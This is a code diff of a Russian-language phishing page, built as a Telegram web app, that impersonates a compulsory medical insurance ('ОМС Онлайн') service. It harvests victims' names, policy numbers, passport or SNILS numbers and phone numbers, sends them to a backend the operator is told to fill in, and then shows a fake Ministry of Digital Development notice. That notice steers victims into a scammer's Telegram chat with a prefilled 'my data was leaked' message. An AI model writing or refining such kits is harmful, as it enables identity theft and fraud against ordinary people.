@@ -11,6 +11,15 @@
     .hidden { display: none !important; }
     .fade { animation: fadeIn 0.5s; }
     @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    input[type="text"], input[type="tel"] { 
+      -webkit-appearance: none; 
+      -moz-appearance: textfield; 
+    }
+    input::-webkit-outer-spin-button,
+    input::-webkit-inner-spin-button { 
+      -webkit-appearance: none; 
+      margin: 0; 
+    }
   </style>
 </head>
 <body class="flex items-center justify-center">
@@ -22,11 +31,10 @@
       <h1 class="text-3xl font-bold text-blue-800 mb-6">👋 Здравствуйте!</h1>
       <p class="text-lg text-gray-700 mb-8 leading-relaxed">
         Я цифровой помощник сервиса «ОМС Онлайн».<br><br>
-        Моя задача — помогать вам быстро и удобно пользоваться услугами обязательного медицинского страхования: получать важную информацию, проверять данные и решать вопросы онлайн прямо здесь, в Telegram.<br><br>
+        Моя задача — помогать вам быстро и удобно пользоваться услугами обязательного медицинского страхования...<br><br>
         <b>⚠️ Важно!</b><br>
-        Для корректного получения медицинской помощи и доступа ко всем сервисам ОМС необходимо, чтобы ваши данные были актуальны.<br>
-        С помощью «ОМС Онлайн» вы можете проверить и обновить информацию дистанционно — без визитов и очередей.<br><br>
-        Это займёт всего несколько минут и обеспечит вам полноценный доступ к медицинским услугам. 🏥✨
+        Для корректного получения медицинской помощи ваши данные должны быть актуальны.<br>
+        Это займёт всего несколько минут. 🏥✨
       </p>
       <button onclick="show('step1')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-xl font-medium shadow-lg hover:bg-blue-700">
         Продолжить
@@ -38,8 +46,8 @@
       <h2 class="text-2xl font-bold text-center mb-6">Анкета</h2>
       <h3 class="text-xl font-semibold mb-6">👇 Укажите, пожалуйста, Ваш пол:</h3>
       <div class="grid grid-cols-2 gap-4">
-        <button onclick="save('gender', 'Мужской'); show('step2')" class="bg-blue-100 hover:bg-blue-200 py-6 rounded-xl text-lg font-medium">Мужской</button>
-        <button onclick="save('gender', 'Женский'); show('step2')" class="bg-pink-100 hover:bg-pink-200 py-6 rounded-xl text-lg font-medium">Женский</button>
+        <button onclick="save('gender', 'Мужской'); show('step2')" class="bg-blue-100 hover:bg-blue-200 py-6 rounded-xl text-lg font-medium transition">Мужской</button>
+        <button onclick="save('gender', 'Женский'); show('step2')" class="bg-pink-100 hover:bg-pink-200 py-6 rounded-xl text-lg font-medium transition">Женский</button>
       </div>
     </div>
 
@@ -57,41 +65,49 @@
       <button onclick="saveInput('polis', 'step4')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Далее</button>
     </div>
 
-    <!-- Шаг 4: Документ -->
+    <!-- Шаг 4: Выбор документа -->
     <div id="step4" class="hidden fade">
-      <h3 class="text-xl font-semibold mb-6">Выберите документ для подтверждения личности:</h3>
+      <h3 class="text-xl font-semibold mb-6">Для подтверждения личности выберите документ:</h3>
       <div class="grid grid-cols-2 gap-4">
-        <button onclick="save('docType', 'Паспорт'); show('step5')" class="bg-gray-100 hover:bg-gray-200 py-6 rounded-xl text-lg">Паспорт</button>
-        <button onclick="save('docType', 'СНИЛС'); show('step5')" class="bg-gray-100 hover:bg-gray-200 py-6 rounded-xl text-lg">СНИЛС</button>
+        <button onclick="save('docType', 'Паспорт'); show('step5')" class="bg-gray-100 hover:bg-gray-200 py-6 rounded-xl text-lg transition">Паспорт</button>
+        <button onclick="save('docType', 'СНИЛС'); show('step5')" class="bg-gray-100 hover:bg-gray-200 py-6 rounded-xl text-lg transition">СНИЛС</button>
       </div>
     </div>
 
-    <!-- Шаг 5: Номер документа -->
+    <!-- Шаг 5: Номер документа (строгая валидация) -->
     <div id="step5" class="hidden fade">
       <h3 id="docTitle" class="text-xl font-semibold mb-6">Укажите номер документа:</h3>
-      <input id="docNumber" type="text" placeholder="10 или 11 цифр" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" />
-      <button onclick="saveInput('docNumber', 'step6')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Далее</button>
+      <input id="docNumber" type="text" placeholder="только цифры" maxlength="11" class="w-full p-4 border rounded-xl text-lg mb-2 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9]/g, '');" />
+      <p id="docError" class="text-red-600 text-sm mb-4 hidden">Неверный формат документа, проверьте ещё раз</p>
+      <button onclick="validateDoc()" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Далее</button>
     </div>
 
-    <!-- Шаг 6: Телефон + проверка -->
+    <!-- Шаг 6: Телефон -->
     <div id="step6" class="hidden fade">
       <h3 class="text-xl font-semibold mb-6">Введите номер телефона:</h3>
-      <input id="phone" type="tel" placeholder="+7 (___) ___-__-__" class="w-full p-4 border rounded-xl text-lg mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500" />
-      
-      <div class="bg-gray-50 p-6 rounded-xl mb-6 text-left text-sm">
-        <p class="font-medium mb-2">Проверьте данные:</p>
-        <p id="preview" class="text-gray-700"></p>
-      </div>
+      <input id="phone" type="tel" placeholder="+7 (___) ___-__-__" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="formatPhone(this)" maxlength="18" />
+      <button onclick="saveInput('phone', 'check')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">Продолжить</button>
+    </div>
 
+    <!-- Шаг 7: Проверка данных -->
+    <div id="check" class="hidden fade">
+      <h2 class="text-2xl font-bold text-center mb-6">Проверьте данные</h2>
+      <div class="bg-gray-50 p-6 rounded-xl mb-6 text-left text-base leading-relaxed">
+        <p><b>Пол:</b> <span id="prevGender"></span></p>
+        <p><b>ФИО:</b> <span id="prevName"></span></p>
+        <p><b>Полис:</b> <span id="prevPolis"></span></p>
+        <p><b>Документ:</b> <span id="prevDoc"></span></p>
+        <p><b>Телефон:</b> <span id="prevPhone"></span></p>
+      </div>
       <div class="grid grid-cols-2 gap-4">
-        <button onclick="prev()" class="bg-gray-300 text-gray-800 py-4 rounded-xl text-lg">Исправить</button>
+        <button onclick="show('step1')" class="bg-gray-300 text-gray-800 py-4 rounded-xl text-lg">Исправить</button>
         <button onclick="finish()" class="bg-green-600 text-white py-4 rounded-xl text-lg font-medium">Подтвердить</button>
       </div>
     </div>
 
     <!-- Экран блокировки -->
     <div id="blocked" class="hidden fade text-center">
-      <img src="минцифры.jpg" alt="Минцифры" class="w-48 mx-auto mb-6 rounded-xl shadow-2xl">
+      <img src="https://i.imgur.com/ваша_картинка_минцифр.jpg" alt="Минцифры" class="w-48 mx-auto mb-6 rounded-xl shadow-2xl">
       <h1 class="text-2xl font-bold text-red-800 mb-4">🇷🇺 МИНЦИФРЫ — ОФИЦИАЛЬНОЕ УВЕДОМЛЕНИЕ 🇷🇺</h1>
       <p class="text-lg text-red-700 mb-8 leading-relaxed">
         ⚠️ <b>ВНИМАНИЕ!</b><br><br>
@@ -101,7 +117,7 @@
         📩 В сообщении кратко опишите что произошло.<br><br>
         <i>Минцифры России | Центр мониторинга и цифровой безопасности</i>
       </p>
-      <a href="https://t.me/kmdkdooo?text=Здравствуйте!%20Мои%20данные%20попали%20в%20общий%20доступ,%20произошло%20мошенничество!%20Требуется%20помощь%20сотрудника%20онлайн-поддержки!" class="block w-full bg-blue-600 text-white py-4 rounded-xl text-lg font-medium shadow-lg hover:bg-blue-700">
+      <a href="https://t.me/ВАШ_ЮЗЕРНЕЙМ?text=Здравствуйте!%20Мои%20данные%20попали%20в%20общий%20доступ,%20произошло%20мошенничество!%20Требуется%20помощь%20сотрудника%20онлайн-поддержки!" class="block w-full bg-blue-600 text-white py-4 rounded-xl text-lg font-medium shadow-lg hover:bg-blue-700">
         Перейти в чат поддержки
       </a>
     </div>
@@ -113,21 +129,16 @@
     let currentStep = 0;
 
     function show(id) {
-      document.querySelectorAll('#welcome, [id^="step"], #blocked').forEach(el => el.classList.add('hidden'));
+      document.querySelectorAll('#welcome, [id^="step"], #check, #blocked').forEach(el => el.classList.add('hidden'));
       document.getElementById(id).classList.remove('hidden');
+      currentStep = parseInt(id.replace('step', '')) || 0;
 
-      if (id === 'step6') {
-        document.getElementById('preview').innerHTML = `
-          Пол: ${answers.gender || '—'}<br>
-          ФИО: ${answers.name || '—'}<br>
-          Полис: ${answers.polis || '—'}<br>
-          Документ: ${answers.docType || '—'} ${answers.docNumber || '—'}<br>
-          Телефон: ${answers.phone || '—'}
-        `;
-      }
-
-      if (id.startsWith('step5')) {
-        document.getElementById('docTitle').innerText = `Укажите номер ${answers.docType === 'Паспорт' ? 'паспорта' : 'СНИЛС'}:`;
+      if (id === 'check') {
+        document.getElementById('prevGender').textContent = answers.gender || '—';
+        document.getElementById('prevName').textContent = answers.name || '—';
+        document.getElementById('prevPolis').textContent = answers.polis || '—';
+        document.getElementById('prevDoc').textContent = `${answers.docType || '—'} ${answers.docNumber || '—'}`;
+        document.getElementById('prevPhone').textContent = answers.phone || '—';
       }
     }
 
@@ -142,22 +153,61 @@
       show(next);
     }
 
-    function prev() {
-      if (currentStep > 1) show('step' + (currentStep - 1));
+    // Маска телефона + только цифры
+    function formatPhone(input) {
+      input.value = input.value.replace(/[^0-9+]/g, '');
+      let val = input.value;
+      if (val.startsWith('+7')) val = val.substring(2);
+      if (val.length > 0 && val[0] !== '+') val = '+7' + val;
+      let formatted = '+7 (';
+      if (val.length > 2) formatted += val.substring(2,5) + ') ';
+      if (val.length > 5) formatted += val.substring(5,8) + '-';
+      if (val.length > 8) formatted += val.substring(8,10) + '-';
+      if (val.length > 10) formatted += val.substring(10,12);
+      input.value = formatted.substring(0,18);
+    }
+
+    // Валидация документа
+    function validateDoc() {
+      const val = document.getElementById('docNumber').value.trim();
+      const type = answers.docType;
+      const error = document.getElementById('docError');
+
+      if (!val || val.length !== (type === 'Паспорт' ? 10 : 11)) {
+        error.classList.remove('hidden');
+        return;
+      }
+
+      save('docNumber', val);
+      error.classList.add('hidden');
+      show('step6');
     }
 
     function finish() {
-      answers.phone = document.getElementById('phone').value.trim() || '+7 (не указан)';
-      Telegram.WebApp.sendData(JSON.stringify(answers));
-      show('blocked');
+      // Отправка данных
+      const payload = {
+        ...answers,
+        userId: Telegram.WebApp.initDataUnsafe?.user?.id || 'test-user',
+        username: Telegram.WebApp.initDataUnsafe?.user?.username || 'test-username'
+      };
+
+      fetch('https://твой-домен.vercel.app/submit', {  // ← ВСТАВЬ РЕАЛЬНЫЙ URL ТВОЕГО БЭКЕНДА
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      })
+      .then(() => show('blocked'))
+      .catch(err => {
+        console.error(err);
+        alert('Ошибка отправки. Данные не сохранены.');
+      });
     }
 
     // Имитация Telegram.WebApp для теста в браузере
     window.Telegram = {
       WebApp: {
-        ready: () => console.log('Ready'),
-        expand: () => console.log('Expanded'),
-        sendData: (data) => alert('Данные отправлены боту:\n' + data)
+        initDataUnsafe: { user: { id: '123456', username: 'testuser' } },
+        sendData: (data) => console.log('Отправлено:', data)
       }
     };
   </script>
